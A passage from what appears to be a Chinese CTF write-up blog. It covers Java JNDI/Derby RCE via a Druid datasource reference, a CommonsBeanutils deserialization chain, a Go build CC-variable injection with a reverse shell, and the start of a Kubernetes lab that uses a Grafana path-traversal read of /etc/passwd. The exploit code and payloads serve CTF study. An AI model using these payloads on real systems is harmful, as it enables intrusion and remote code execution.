class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SerializeUtil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ByteArrayOutputStream</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// Dispatcher.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>evil<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Dispatcher</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Dispatcher</span> <span class="token constant">INSTANCE</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">DruidController</span> druidController <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DruidController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Dispatcher</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">INSTANCE</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token class-name">Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">service</span><span class="token punctuation">(</span><span class="token class-name">String</span> path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"/Druid"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> druidController<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// DruidController.java</span><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>evil<span class="token punctuation">.</span>server</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DruidController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"javax.sql.DataSource"</span><span class="token punctuation">,</span> <span class="token string">"com.alibaba.druid.pool.DruidDataSourceFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"driverClassName"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.derby.jdbc.EmbeddedDriver"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"jdbc:derby:ctf;create=true"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"initialSize"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> initCommands <span class="token operator">=</span> <span class="token string">"CALL SQLJ.INSTALL_JAR('http://127.0.0.1/rce.jar', 'APP.Sample', 0);"</span>                <span class="token operator">+</span> <span class="token string">"CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP.Sample');"</span>                <span class="token operator">+</span> <span class="token string">"CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'rce.exec';"</span>                <span class="token operator">+</span> <span class="token string">"CALL SALES.TOTAL_REVENUES();"</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"initConnectionSqls"</span><span class="token punctuation">,</span> initCommands<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"init"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Derby Connect to Database: ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ref<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Jar 包部分</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// rce.java</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> rce <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /c calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">javac rce.javajar <span class="token parameter variable">-cvf</span> rce.jar rce.class</code></pre><p>访问 <code>http://127.0.0.1:8080/lookup?url=ldap://127.0.0.1:1389/Druid</code> 即可实现RCE</p><h1 id="DerbyPlus-🩸🩸-452PT"><a href="#DerbyPlus-🩸🩸-452PT" class="headerlink" title="DerbyPlus 🩸🩸 | 452PT"></a>DerbyPlus 🩸🩸 | 452PT</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="language-none"><code class="language-none">我再也不用 Java 8 了 😭 (Plus)Hint：Derby 的升级版, 两道题之间存在联系, 思路都是一样的</code></pre><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>与 Derby 一题基本相似，不同之处有以下两处</p><p>pom.xml</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><p>添加了 <code>commons-beanutils 1.8.3</code> 作为依赖</p><p>IndexController.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/deserialize"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">String</span> body<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ObjectInputStream</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      input<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      input<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> throwable<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        input<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> throwable1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        throwable<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>throwable1<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token keyword">throw</span> throwable<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"ok"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>将原先的 jndi lookup 部分替换成了 <code>readObject()</code> 反序列化接口</p><p>由于环境仍然是 Java 17，受到较多限制，仍然考虑通过触发 jndi lookup 完成与上一题 Derby 的相同过程实现 RCE</p><p>由于依赖中只包含 <code>commons-beanutils 1.8.3</code> ，考虑使用 <code>CommonsBeanutils1NoCC</code> + <code>com.sun.jndi.ldap.LdapAttribute</code> 链触发 jndi lookup</p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// LdapExp.java</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">CompositeName</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LdapExp</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> fieldName<span class="token punctuation">,</span> <span class="token class-name">Object</span> newValue<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldName<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> newValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> ldapAttributeClazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.jndi.ldap.LdapAttribute"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Constructor</span> ldapAttributeClazzConstructor <span class="token operator">=</span> ldapAttributeClazz<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ldapAttributeClazzConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Object</span> ldapAttribute <span class="token operator">=</span> ldapAttributeClazzConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>ldapAttribute<span class="token punctuation">,</span> <span class="token string">"baseCtxURL"</span><span class="token punctuation">,</span> <span class="token string">"ldap://127.0.0.1:1389/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>ldapAttribute<span class="token punctuation">,</span> <span class="token string">"rdn"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">CompositeName</span><span class="token punctuation">(</span><span class="token string">"Druid/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token constant">CASE_INSENSITIVE_ORDER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> <span class="token string">"size"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"attributeDefinition"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>pq<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>ldapAttribute<span class="token punctuation">,</span> ldapAttribute<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>pq<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>后续过程与 Derby 一题相同</p><h1 id="MyGo-430PT"><a href="#MyGo-430PT" class="headerlink" title="MyGo | 430PT"></a>MyGo | 430PT</h1><h2 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h2><pre class="language-none"><code class="language-none">My Golang Cross-CompilerHint：go build 环境变量注入 RCE</code></pre><h2 id="解题过程-2"><a href="#解题过程-2" class="headerlink" title="解题过程"></a>解题过程</h2><p>题目是一个 golang 的代码编译器</p><p>结合 Hint 可知，此处存在 go build 时的 env 注入漏洞：</p><pre class="language-go" data-language="go"><code class="language-go">cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"go"</span><span class="token punctuation">,</span> <span class="token string">"build"</span><span class="token punctuation">,</span> <span class="token string">"-o"</span><span class="token punctuation">,</span> <span class="token string">"main"</span><span class="token punctuation">,</span> <span class="token string">"main.go"</span><span class="token punctuation">)</span>cmd<span class="token punctuation">.</span>Env <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">Environ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> env<span class="token operator">...</span><span class="token punctuation">)</span></code></pre><p>在网上进行了初步的搜索，发现好像找不到相关的漏洞信息，于是前往 go 的官方文档寻找<br><a href="https://pkg.go.dev/cmd/go#hdr-Environment_variables">go command - cmd&#x2F;go - Go Packages#hdr-Environment_variables</a></p><p>结合题目前端里 <code>Enable CGO</code> 的提示，我们发现 go 代码中可以利用 cgo 注入 c 语言语句，而在编译包含 c 语言语句的 go 代码时会调用外部编译器来编译这部分 c 语言语句，由于调用外部编译器的命令是由环境变量 <code>CC</code> 控制的，因此可以通过注入 <code>CC</code> 环境变量来实现 RCE</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><pre class="language-none"><code class="language-none">&quot;CGO_ENABLED&quot;:&quot;1&quot;,&quot;CC&quot;:&quot;bash -c &#123;echo,x&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &#x2F;&#x2F; x: &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&quot; encoded with base64</code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云原生安全 Kubernetes for Everyone WriteUp</title>
      <link href="/write-up/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-kubernetes-for-everyone-writeup/"/>
      <url>/write-up/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-kubernetes-for-everyone-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1. 端口扫描"></a>1. 端口扫描</h2><p>使用 <code>nmap</code> 进行全端口扫描：</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-F</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">></span></code></pre><pre class="language-none"><code class="language-none">PORT     STATE SERVICE22&#x2F;tcp   open  ssh111&#x2F;tcp  open  rpcbind3000&#x2F;tcp open  ppp5000&#x2F;tcp open  upnp</code></pre><h2 id="2-Grafana任意文件读取"><a href="#2-Grafana任意文件读取" class="headerlink" title="2. Grafana任意文件读取"></a>2. Grafana任意文件读取</h2><p>3000 端口处存在一个 版本号为 <code>v8.3.0</code> 的 <code>Grafana</code>：</p><p><img src="image-1.png" alt="image-1.png"><br>在 <code>exploit-db</code> 中搜索该版本 <code>Grafana</code> 漏洞：</p><pre class="language-none"><code class="language-none">CVE-2021-43798：Grafana任意文件读取漏洞https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;50581</code></pre><p>使用 payload 阅读 <code>/etc/passwd</code>：</p><pre class="language-none"><code class="language-none">&#x2F;public&#x2F;plugins&#x2F;gettingstarted&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>&#x2F;etc&#x2F;passwd</p><pre class="language-none"><code class="language-none">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ashbin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologindaemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologinadm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologinlp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologinsync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;syncshutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdownhalt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;haltmail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologinnews:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologinuucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologinoperator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologinman:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologinpostmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologincron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologinftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologinsshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologinat:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologinsquid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologinxfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologingames:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologincyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologinvpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologinntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologinsmmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologinguest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologingrafana:x:472:0:hereiamatctf907:&#x2F;home&#x2F;grafana:&#x2F;sbin&#x2F;nologin</code></pre><p>在其中获得 ssh 密码 <code>hereiamatctf907</code> （好奇怪的出现位置）</p><h2 id="3-静态文件信息泄露"><a href="#3-静态文件信息泄露" class="headerlink" title="3. 静态文件信息泄露"></a>3. 静态文件信息泄露</h2><p>5000 端口处存在一个静态小游戏：</p><p><img src="image-2.png" alt="image-2.png"><br>其中 main.css 中存在一段被注释的 @import 导入样式表比较可疑：<br>&#x2F;static&#x2F;css&#x2F;main.css</p><pre class="language-none"><code class="language-none">&#x2F;* @import url(&quot;https:&#x2F;&#x2F;pastebin.com&#x2F;cPs69B0y&quot;); *&#x2F;</code></pre><p>打开后发现一段编码后的字符串：</p><pre class="language-none"><code 